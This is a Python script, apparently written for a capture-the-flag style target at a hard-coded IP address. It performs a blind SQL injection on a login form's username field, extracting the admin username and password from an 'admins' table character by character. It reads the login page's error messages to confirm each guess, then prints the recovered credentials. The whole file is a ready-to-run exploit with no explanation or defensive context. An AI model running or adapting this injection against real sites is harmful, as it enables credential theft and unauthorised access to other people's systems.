#!/usr/bin/env python3

import requests
import string

URL = 'http://35.227.24.107/3bec770bac/login'

ALPHABET = string.printable

VULNERABLE_PARAMETER = 'username'

INJECTION_MESSAGE = 'Unknown user'

TEST_MESSAGES = ['Unknown user', 'Invalid password']

DATA = {'username': '', 'password': ''}
RIGHT_DATA = {'username': '', 'password': ''}

parameters_to_find = ['username', 'password']

def find_parameter(parameter, test_message):
    print('Searching %s' % parameter)
    index = 1
    found = False
    temp_value = ''
    while not found:
        for char in ALPHABET:
            DATA[VULNERABLE_PARAMETER] = "' or (SELECT MID(%s,%d,1) FROM admins LIMIT 0,1)='%c' #" % (parameter, index, char)
            r = requests.post(url = URL, data = DATA)

            if INJECTION_MESSAGE not in r.text:
                temp_value += char
                index += 1
                print ('%s' % (temp_value))
                break

            # Check if the parameter is correct
            RIGHT_DATA[parameter] = temp_value
            r = requests.post(url = URL, data = RIGHT_DATA)
            if test_message not in r.text:
                print ('Found %s: %s' % (parameter, temp_value))
                found = True
                break

def main():
    for i in range(len(parameters_to_find)):
        parameter = parameters_to_find[i]
        test_message = TEST_MESSAGES[i]
        find_parameter(parameter, test_message)

if __name__ == '__main__':
    main()
